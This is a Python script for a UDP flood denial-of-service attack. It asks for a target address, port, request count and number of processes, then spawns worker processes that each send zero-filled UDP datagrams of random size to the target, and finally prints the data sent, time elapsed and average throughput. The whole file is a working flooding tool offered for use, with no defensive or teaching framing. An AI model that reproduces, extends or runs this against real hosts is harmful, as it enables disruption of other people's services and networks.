import multiprocessing
import time
import random
import socket
q = multiprocessing.Queue()
elapsed = 0

print("""
  _ ____   ___    __  
 (_)___ \ / _ \  / /  
  _  __) | (_) |/ /_  
 | ||__ < > _ <| '_ \ 
 | |___) | (_) | (_) |
 |_|____/ \___/ \___/

""")


def dos(target, port, reqamount):
    byte = random.randint(0, 20000)
    print(f'[!]{multiprocessing.current_process().name} spawned, autogenerated packet size is {byte} bytes.')
    bsize = byte
    reqs = 0
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte = bytes(byte)
    while reqs < reqamount:
        try:
            client.sendto(byte, (target, port))
        except:
            print('Exception occured at loop > ' + str(reqs))
            break
        else:
            reqs += 1
            continue
    q.put(bsize)

t = input('Enter target (defaults to 192.168.0.1) > ')
if len(t) == 0:
    t = '192.168.0.1'

p = input('Enter port (defaults to 80) > ')
if len(p) == 0:
    p = 80
else:
    p = int(p)

r = input('Enter amount of requests (defaults to 100) > ')
if len(r) == 0:
    r = 100
else:
    r = int(r)

mpa = input('Enter amount of processes, one process for each core (defaults to 4) > ')
if len(mpa) == 0:
    mpa = 4
else:
    mpa = int(mpa)

total = 0

if __name__ == '__main__':
    start = time.time()
    for i in range(0, mpa):
        mp = multiprocessing.Process(target=dos, args=(t, p, r/mpa))
        mp.start()
        mp.join()
        finish = time.time()
        while not q.empty():
            total += round((q.get() * r) / 1000000, 2)

#calculate attack stats
elapsed = round(finish - start, 2)
mbs =  round(total / elapsed, 2)
total = round(total, 2)

print('-' * 60)
print('Attack finished!')
print(f'[+]Total data sent: {total}MB')
print(f'[+]Time elapsed: {elapsed} seconds.')
print(f'[+]Average speed: {mbs}MB per second.')
print('-' * 60)
